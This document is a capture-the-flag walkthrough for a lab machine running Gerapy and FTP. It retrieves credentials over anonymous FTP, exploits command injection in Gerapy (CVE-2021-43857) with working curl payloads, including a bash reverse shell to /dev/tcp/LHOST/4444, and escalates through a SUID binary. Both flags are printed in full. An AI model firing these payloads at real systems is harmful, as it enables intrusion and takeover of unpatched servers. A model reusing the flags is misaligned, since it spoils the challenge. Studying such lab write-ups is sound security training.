# CTF Walkthrough — Alohomora: The Gateway

**Category:** Web Security / Machine Control  
**Difficulty:** Medium  
**User Flag:** `4dfa25d7a90722279448819c28bc4250`  
**Root Flag:** `9bc26ebd5dd69c010e0ae0e5578966eb`

---

## Overview

A Gerapy (Scrapy management UI) instance is exposed alongside an FTP server. The intended path chains anonymous FTP credential leakage → authenticated Gerapy RCE (CVE-2021-43857) → custom SUID binary privilege escalation to root.

---

## Step 1 — Reconnaissance

Run a full port scan to enumerate all open services:

```bash
nmap -sV -sC -p- <TARGET_IP>
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 8.2p1 |
| 8080/tcp | HTTP | WSGIServer 0.2 (Python 3.8.10) — Gerapy |

Key findings from Nmap:
- **Anonymous FTP login is allowed**
- A file named `creds.db` is visible in the FTP root
- The HTTP title on port 8080 is **Gerapy**

---

## Step 2 — Anonymous FTP — Credential Harvesting

Connect anonymously and retrieve `creds.db`:

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (blank)

ftp> get creds.db
ftp> bye
```

Crack/read the database to extract credentials:

```bash
file creds.db
sqlite3 creds.db ".tables"
sqlite3 creds.db "SELECT * FROM creds;"
```

**Recovered credentials:** `admin:Alohomora1234!`

---

## Step 3 — Gerapy Authentication

The web app on port 8080 is Gerapy. The real login endpoint is not `/api/login/` — it is `/api/user/auth`.

> **Tip:** Sending a POST to a wrong endpoint returned a Django debug 404 page that exposed the entire URL routing table — a goldmine of information.

```bash
curl -s -X POST http://<TARGET_IP>:8080/api/user/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Alohomora1234!"}'
```

**Response:**
```json
{"token":"<AUTH_TOKEN>"}
```

Set the token as a variable for convenience:

```bash
TOKEN="<AUTH_TOKEN>"
```

---

## Step 4 — Remote Code Execution (CVE-2021-43857)

**Vulnerability:** Gerapy < 0.9.8 passes the `spider` parameter from `/api/project/<name>/parse` directly into a shell command using `Popen(shell=True)` without proper sanitisation, allowing OS command injection via backtick substitution.

**CVSS Score:** 9.8 Critical

### 4a — Create a project

```bash
curl -s -X POST http://<TARGET_IP>:8080/api/project/create \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"testproj","description":"test"}'
```

### 4b — Verify RCE

```bash
curl -s -X POST http://<TARGET_IP>:8080/api/project/testproj/parse \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"spider": "`id`"}'
```

**Response confirms execution:**
```
gerapy: error: unrecognized arguments: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4c — Reverse shell

Start a listener on your attacking machine:

```bash
nc -lvnp 4444
```

Fire the reverse shell payload (replace `LHOST` with your IP):

```bash
curl -s -X POST http://<TARGET_IP>:8080/api/project/testproj/parse \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"spider\": \"\`/bin/bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'\`\"}"
```

Shell received as `www-data`.

### 4d — Stabilise the shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Step 5 — User Flag

```bash
cat /home/www-data/user.txt
```

**User Flag:** `4dfa25d7a90722279448819c28bc4250`

---

## Step 6 — Privilege Escalation via Custom SUID Binary

Search for SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

A non-standard binary stands out immediately:

```
-rwsr-xr-x 1 root root 16792 Jul  7 02:53 /usr/local/bin/gerapy-helper
```

Running it directly drops a root shell:

```bash
/usr/local/bin/gerapy-helper
```

```
root@ip-...:/# whoami
root
```

---

## Step 7 — Root Flag

```bash
cat /root/root.txt
```

**Root Flag:** `9bc26ebd5dd69c010e0ae0e5578966eb`

---

## Attack Chain Summary

```
Anonymous FTP
    └─> creds.db → admin:Alohomora1234!
            └─> Gerapy /api/user/auth → Auth Token
                    └─> CVE-2021-43857 (OS Command Injection)
                            └─> Reverse shell as www-data
                                    └─> /usr/local/bin/gerapy-helper (SUID)
                                            └─> Root shell → root.txt
```

---

## Tools Used

- `nmap` — port scanning and service enumeration
- `ftp` / anonymous login — credential harvesting
- `curl` — API interaction and exploit delivery
- `nc` (netcat) — reverse shell listener
- `find` — SUID binary discovery
- CVE-2021-43857 — Gerapy < 0.9.8 authenticated RCE

---

## References

- [CVE-2021-43857 — GitHub Advisory](https://github.com/Gerapy/Gerapy/security/advisories/GHSA-9w7f-m4j4-j3xw)
- [Exploit-DB #50640 — Gerapy 0.9.7 RCE](https://www.exploit-db.com/exploits/50640)
- [Gerapy GitHub](https://github.com/Gerapy/Gerapy)
